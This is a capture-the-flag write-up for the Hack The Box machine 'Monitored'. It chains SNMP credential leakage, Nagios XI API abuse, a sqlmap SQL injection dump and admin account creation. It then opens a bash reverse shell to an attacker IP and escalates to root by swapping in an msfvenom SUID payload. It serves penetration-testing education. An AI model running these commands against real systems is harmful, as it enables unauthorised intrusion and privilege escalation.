---
title: "HTB Writeup: Monitored"
author: xpnt
date: 2024-05-07
image:
  path: https://pbs.twimg.com/media/GDkfNA1asAAJz8P?format=jpg&name=medium###Q1NVe3hwbnRfMTB2MzVfbTRydS1jaDRufQ==
  height: 1500
  width: 500
categories: [Hack The Box, "Season 4: Savage Lands"]
tags: [labs,snmp,snmpwalk,nagios XI]
---
 


# WriteUp
- [Link: Pwned Date](https://www.hackthebox.com/achievement/machine/1504363/583)

## Description

- Monitored is a medium-difficulty Linux machine that features a Nagios instance. Credentials for the service are obtained via the SNMP protocol, which reveals a username and password combination provided as command-line parameters. Using the Nagios API, an authentication token for a disabled account is obtained, which leads to access to the application's dashboard. From there, a SQL injection ([`CVE-2023-40931`](https://nvd.nist.gov/vuln/detail/CVE-2023-40931)) is abused to obtain an administrator API key, with which a new admin account is created and used to run arbitrary commands on the instance, leading to a reverse shell. Finally, `sudo` access to a bash script is abused to read the `root` user's SSH key and authenticate as `root`.

## User

- We start with a port scan. With it, we notice that the machine has the TCP ports `22, 80, 389, 443, 5667` open.

```bash
# Nmap 7.94SVN scan initiated Sun Apr  7 15:30:44 2024 as: nmap -sCV -p22,80,389,443,5667 -n -Pn -v -oN scanPorts 10.10.11.248
Nmap scan report for 10.10.11.248
Host is up (0.12s latency).

PORT     STATE SERVICE    VERSION
22/tcp   open  ssh        OpenSSH 8.4p1 Debian 5+deb11u3 (protocol 2.0)
| ssh-hostkey: 
|   3072 61:e2:e7:b4:1b:5d:46:dc:3b:2f:91:38:e6:6d:c5:ff (RSA)
|   256 29:73:c5:a5:8d:aa:3f:60:a9:4a:a3:e5:9f:67:5c:93 (ECDSA)
|_  256 6d:7a:f9:eb:8e:45:c2:02:6a:d5:8d:4d:b3:a3:37:6f (ED25519)
80/tcp   open  http       Apache httpd 2.4.56
|_http-title: Did not follow redirect to https://nagios.monitored.htb/
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.56 (Debian)
389/tcp  open  ldap       OpenLDAP 2.2.X - 2.3.X
443/tcp  open  ssl/http   Apache httpd 2.4.56 ((Debian))
| ssl-cert: Subject: commonName=nagios.monitored.htb/organizationName=Monitored/stateOrProvinceName=Dorset/countryName=UK
| Issuer: commonName=nagios.monitored.htb/organizationName=Monitored/stateOrProvinceName=Dorset/countryName=UK
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2023-11-11T21:46:55
| Not valid after:  2297-08-25T21:46:55
| MD5:   b36a:5560:7a5f:047d:9838:6450:4d67:cfe0
|_SHA-1: 6109:3844:8c36:b08b:0ae8:a132:971c:8e89:cfac:2b5b
|_http-title: Nagios XI
|_http-server-header: Apache/2.4.56 (Debian)
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
| tls-alpn: 
|_  http/1.1
|_ssl-date: TLS randomness does not represent time
5667/tcp open  tcpwrapped
Service Info: Host: nagios.monitored.htb; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Sun Apr  7 15:31:05 2024 -- 1 IP address (1 host up) scanned in 21.27 seconds
```

-  Given that there is a redirect to the domain `nagios.monitored.htb`, we will add this domain to our `/etc/hosts` file using the command `echo "10.10.11.248 nagios.monitored.htb" | sudo tee -a /etc/hosts`.

- Upon entering the website, we are presented with an interface showing that the web server is using _Nagios XI_. Additionally, we can access the Nagios interface through the path `/nagiosxi/login.php`, however, we do not have credentials.

![](/assets/images/HTB-Writeup-Monitored/Pasted image 20240407143913.png)

- We will try [default](https://support.nagios.com/forum/viewtopic.php?t=544#:~:text=The%20default%20user%20and%20password,you%20first%20access%20the%20site.), credentials as per this source, however, we are unable to login.

- When performing fuzzing to find available directories, we get the following results. Among them, we will first analyze the path `/nagiosxi/api`

![](/assets/images/HTB-Writeup-Monitored/Pasted image 20240407184804.png)

-  Continuing with the fuzzing using the wordlist `big.txt`, we notice that in the path `/nagiosxi/api/v1/`, the following endpoints are available.

![](/assets/images/HTB-Writeup-Monitored/Pasted image 20240407192104.png)

- In which the `authenticate` endpoint indicates that valid credentials need to be provided via the `POST` method.

![](/assets/images/HTB-Writeup-Monitored/Pasted image 20240407192449.png)

![](/assets/images/HTB-Writeup-Monitored/Pasted image 20240407192532.png)

- Given that said endpoint requires _valid credentials_, we searched for vulnerabilities related to _Nagios XI_ using `searchsploit` and noticed that one of them is related to the `SNMP` protocol, which allows `monitoring`(`maybe it's a hint`) the network infrastructure among other things. Therefore, we performed a UDP scan and noticed that indeed `port 161 is open`.

![](/assets/images/HTB-Writeup-Monitored/Pasted image 20240407185144.png) 

![](/assets/images/HTB-Writeup-Monitored/Pasted image 20240407190150.png)

- We use the `snmpwalk` tool with the classic _community string_ `public`.

![](/assets/images/HTB-Writeup-Monitored/Pasted image 20240407191348.png)

- With `snmpwalk`, we found what appears to be credentials for the user `svc:XjH7VCehowpR1xZB`.

![](/assets/images/HTB-Writeup-Monitored/Pasted image 20240407192002.png)

- With those credentials, we tried to log in but were unsuccessful.

![](/assets/images/HTB-Writeup-Monitored/Pasted image 20240407201128.png)

- However, we were able to authenticate via a POST request to the `authenticate` endpoint and obtain an `auth_token`.

![](/assets/images/HTB-Writeup-Monitored/Pasted image 20240407200005.png)

- When trying to authenticate again on `login.php`, we found that the account has been disabled. However, in our search for authentication with an _auth_token_, we found the following reference [API](https://www.nagios.org/ncpa/help/2.2/api.html)

![](/assets/images/HTB-Writeup-Monitored/Pasted image 20240407200244.png)

![](/assets/images/HTB-Writeup-Monitored/Pasted image 20240407200918.png)

-  When attempting to authenticate following that specification, we are issued a cookie and successfully accessed the dashboard.

![](/assets/images/HTB-Writeup-Monitored/Pasted image 20240407201729.png)

- Once authenticated, while searching for authenticated vulnerabilities, we found the following [CVE-2023-40931](https://outpost24.com/blog/nagios-xi-vulnerabilities/), which allows exploitation of an `SQLi` at the path `/nagiosxi/admin/banner_message-ajaxhelper.php`. We attempted to exploit it with sqlmap and obtained the following 3 types of SQLi.

![](/assets/images/HTB-Writeup-Monitored/Pasted image 20240407145115.png)

- Then we will dump the `xi_users` table from which we obtain the API key of the administrator user.

```bash
sqlmap --technique=E --url "https://nagios.monitored.htb//nagiosxi/admin/banner_message-ajaxhelper.php" -X POST --data "action=acknowledge_banner_message&id=3" -cookie 'nagiosxi=8p56l6va3u06cvq3momdb7rsb8' -p id -D nagiosxi -T xi_users --dump
```

![](/assets/images/HTB-Writeup-Monitored/Pasted image 20240407153704.png)

- Performing a search on how to create an account with the admin API key, we found this [blog.](https://support.nagios.com/forum/viewtopic.php?t=42923)

![](/assets/images/HTB-Writeup-Monitored/Pasted image 20240407154621.png)

- Additionally, we will search for the post parameter that allows the creation of an account with administrator privileges. In this [PDF file](https://assets.nagios.com/downloads/nagiosxi/docs/Understanding-Nagios-XI-User-Rights.pdf), we found that through the admin interface there is an option called `Authorization Level`, which allows setting administrator privileges.

![](/assets/images/HTB-Writeup-Monitored/Pasted image 20240407155301.png)


- In this [post](https://support.nagios.com/forum/viewtopic.php?t=43479), we found the format of the parameters. Therefore, upon performing the following search, we noticed that the `auth_level` parameter can be added when creating users.

![](/assets/images/HTB-Writeup-Monitored/Pasted image 20240407154912.png)

![](/assets/images/HTB-Writeup-Monitored/Pasted image 20240407160224.png)

![](/assets/images/HTB-Writeup-Monitored/Pasted image 20240407155541.png)

- Finally, we created the user `xpnt` with **administrator privileges**.

```bash
curl -XPOST "https://nagios.monitored.htb/nagiosxi/api/v1/system/user?apikey=IudGPHd9pEKiee9MkJ7ggPD89q3YndctnPeRQOmS2PQ7QIrbJEomFVG6Eut9CHLL&pretty=1" -d "username=xpnt&password=xpnt&name=xpnt&email=xpnt@monitored.htb&auth_level=admin" -k
```

![](/assets/images/HTB-Writeup-Monitored/Pasted image 20240407203218.png)

- Searching for a way to execute commands within Nagios XI, we found the following [blog](https://nagiosenterprises.my.site.com/support/s/article/Using-the-Core-Config-Manager-for-Service-Management-fc9aa4e4). In this blog, it is explained that in the creation of **Services**, we can test a command previously created in the **Commands** section.

![](/assets/images/HTB-Writeup-Monitored/Pasted image 20240507100213.png)

![](/assets/images/HTB-Writeup-Monitored/Pasted image 20240507110304.png)

```bash
bash -c 'bash -i>&/dev/tcp/10.10.14.162/443 0>&1'
```

>Comments:
> It is worth noting that `double quotes` in the paylaod are not correctly interpreted
{: .prompt-info }
![](/assets/images/HTB-Writeup-Monitored/Pasted image 20240407210414.png)

- With that, we obtained a `reverse shell` and were able to read _user.txt_.

![](/assets/images/HTB-Writeup-Monitored/Pasted image 20240407210550.png)

## Root

- When running `sudo -l`, we noticed that we can execute several commands with `sudo` without providing a password.

```bash
nagios@monitored:/home/svc$ sudo -l
Matching Defaults entries for nagios on localhost:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User nagios may run the following commands on localhost:
    (root) NOPASSWD: /etc/init.d/nagios start
    (root) NOPASSWD: /etc/init.d/nagios stop
    (root) NOPASSWD: /etc/init.d/nagios restart
    (root) NOPASSWD: /etc/init.d/nagios reload
    (root) NOPASSWD: /etc/init.d/nagios status
    (root) NOPASSWD: /etc/init.d/nagios checkconfig
    (root) NOPASSWD: /etc/init.d/npcd start
    (root) NOPASSWD: /etc/init.d/npcd stop
    (root) NOPASSWD: /etc/init.d/npcd restart
    (root) NOPASSWD: /etc/init.d/npcd reload
    (root) NOPASSWD: /etc/init.d/npcd status
    (root) NOPASSWD: /usr/bin/php /usr/local/nagiosxi/scripts/components/autodiscover_new.php *
    (root) NOPASSWD: /usr/bin/php /usr/local/nagiosxi/scripts/send_to_nls.php *
    (root) NOPASSWD: /usr/bin/php /usr/local/nagiosxi/scripts/migrate/migrate.php *
    (root) NOPASSWD: /usr/local/nagiosxi/scripts/components/getprofile.sh
    (root) NOPASSWD: /usr/local/nagiosxi/scripts/upgrade_to_latest.sh
    (root) NOPASSWD: /usr/local/nagiosxi/scripts/change_timezone.sh
    (root) NOPASSWD: /usr/local/nagiosxi/scripts/manage_services.sh *
    (root) NOPASSWD: /usr/local/nagiosxi/scripts/reset_config_perms.sh
    (root) NOPASSWD: /usr/local/nagiosxi/scripts/manage_ssl_config.sh *
    (root) NOPASSWD: /usr/local/nagiosxi/scripts/backup_xi.sh *
```

- I tried to check if the user `nagios` had write privileges on any of the scripts in `PHP` and `Bash`, but no luck.

```bash
>sudo -l  | grep -oP ": \K.*sh"  | xargs -n1 ls -la
>sudo -l  | grep -oP ": \K.*php"  | xargs -n1 ls -la
```

- After reviewing the functionality of each of the scripts, I noticed that the `nagios` service could be stopped and restarted with the help of the script `/usr/local/nagiosxi/scripts/manage_services.sh`

```bash
#!/bin/bash
#
# Manage Services (start/stop/restart)
# Copyright (c) 2015-2020 Nagios Enterprises, LLC. All rights reserved.
#
# =====================
# Built to allow start/stop/restart of services using the proper method based on
# the actual version of operating system.
#
# Examples:
# ./manage_services.sh start httpd
# ./manage_services.sh restart mysqld
# ./manage_services.sh checkconfig nagios
#

BASEDIR=$(dirname $(readlink -f $0))

# Import xi-sys.cfg config vars
. $BASEDIR/../etc/xi-sys.cfg

# Things you can do
first=("start" "stop" "restart" "status" "reload" "checkconfig" "enable" "disable")
second=("postgresql" "httpd" "mysqld" "nagios" "ndo2db" "npcd" "snmptt" "ntpd" "crond" "shellinaboxd" "snmptrapd" "php-fpm")

# Helper functions
# -----------------------

contains () {
    local array="$1[@]"
    local seeking=$2
    local in=1
    for element in "${!array}"; do
        if [[ "$element" == "$seeking" ]]; then
            in=0
            break
        fi
    done
    return $in
}

# Verify to avoid abuse
# -----------------------

# Check to verify the proper usage format
# ($1 = action, $2 = service name)

if ! contains first "$1"; then
    echo "First parameter must be one of: ${first[*]}"
    exit 1
fi

if ! contains second "$2"; then
    echo "Second parameter must be one of: ${second[*]}"
    exit 1
fi

action=$1

# if service name is defined in xi-sys.cfg use that name
# else use name passed
if [ "$2" != "php-fpm" ] && [ ! -z "${!2}" ];then
    service=${!2}
else
    service=$2
fi

# if the action is status, add -n 0 to args to stop journal output
# on CentOS/RHEL 7 systems
args=""
if [ "$action" == "status" ]; then
    args="-n 0"
fi

# Special case for ndo2db since we don't use it anymore
if [ "$service" == "ndo2db" ]; then
    echo "OK - Nagios XI 5.7 uses NDO3 build in and no longer uses the ndo2db service"
    exit 0
fi

# Run the command
# -----------------------

# CentOS / Red Hat

if [ "$distro" == "CentOS" ] || [ "$distro" == "RedHatEnterpriseServer" ] || [ "$distro" == "EnterpriseEnterpriseServer" ] || [ "$distro" == "OracleServer" ]; then
    # Check for enable/disable verb
    if [ "$action" == "enable" ] || [ "$action" == "disable" ]; then
        if [ `command -v systemctl` ]; then
            `which systemctl` --no-pager "$action" "$service"
        elif [ `command -v chkconfig` ]; then
            chkconfig_path=`which chkconfig`
            if [ "$action" == "enable" ]; then
                "$chkconfig_path" --add "$service"
                return_code=$?
            elif [ "$action" == "disable" ]; then
                "$chkconfig_path" --del "$service"
                return_code=$?
            fi
        fi

        exit $return_code
    fi

    if [ `command -v systemctl` ]; then
        `which systemctl` --no-pager "$action" "$service" $args
        return_code=$?
        if [ "$service" == "mysqld" ] && [ $return_code -ne 0 ]; then
            service="mariadb"
            `which systemctl` "$action" "$service" $args
            return_code=$?
        fi
    elif [ ! `command -v service` ]; then
        "/etc/init.d/$service" "$action"
        return_code=$?
    else
        `which service` "$service" "$action"
        return_code=$?
    fi
fi

# OpenSUSE / SUSE Enterprise

if [ "$distro" == "SUSE LINUX" ]; then
    if [ "$dist" == "suse11" ]; then
        `which service` "$service" "$action"
        return_code=$?
    fi
fi


# Ubuntu / Debian

if [ "$distro" == "Debian" ] || [ "$distro" == "Ubuntu" ]; then
    # Adjust the shellinabox service, no trailing 'd' in Debian/Ubuntu
    if [ "$service" == "shellinaboxd" ]; then
        service="shellinabox"
    fi

    if [ `command -v systemctl` ]; then
        `which systemctl` --no-pager "$action" "$service" $args
        return_code=$?
    else
        `which service` "$service" "$action"
        return_code=$?
    fi
fi

# Others?

exit $return_code
```

- Given that the script `/usr/local/nagiosxi/scripts/manage_services.sh` can be executed with `root` privileges and since we have write privileges on the `/usr/local/nagios/bin/nagios` binary file, we can replace this binary file with another one that executes a privileged task in order to escalate our privileges (`chmod u+s /bin/bash`).

![](/assets/images/HTB-Writeup-Monitored/Pasted image 20240507124855.png)

![](/assets/images/HTB-Writeup-Monitored/Pasted image 20240507131525.png)

- We will use `msfvenom` to generate a binary file named `nagios` that executes `chmod u+s /bin/bash`.

```bash
❯ msfvenom -p linux/x64/exec -f elf CMD='chmod u+s /bin/bash' -o nagios
[-] No platform was selected, choosing Msf::Module::Platform::Linux from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 56 bytes
Final size of elf file: 176 bytes
Saved as: nagios
```

-  Then, we will replace the binary file `/usr/local/nagios/bin/nagios` with the one generated using `msfvenom`.

![](/assets/images/HTB-Writeup-Monitored/Pasted image 20240507131648.png)

- We will grant execution permissions.

![](/assets/images/HTB-Writeup-Monitored/Pasted image 20240507141749.png)

- Then, we will restart the `nagios` service by executing the script `/usr/local/nagiosxi/scripts/manage_services.sh` as root. Nice! I'm able to convert to the `root` user now, and then I'll read `/root/root.txt`

```bash
nagios@monitored:~$ sudo /usr/local/nagiosxi/scripts/manage_services.sh restart nagios
Job for nagios.service failed because the control process exited with error code.
See "systemctl status nagios.service" and "journalctl -xe" for details.

nagios@monitored:~$ ls -la /bin/bash
ls -la /bin/bash
-rwsr-xr-x 1 root root 1234376 Mar 27  2022 /bin/bash

nagios@monitored:~$ bash -p
bash-5.1# whoami
root

bash-5.1# cat /root/root.txt
0fae616536de29cf3325855864dfd105
```
>I hope you had as much fun reading this write up as I did writing it. If this writeup helped you, please feel free to go to my [`Hack The Box profile (xpnt)`](https://app.hackthebox.com/users/1504363) and give me a respect 😁. Happy Hacking!!👾
{: .prompt-tip }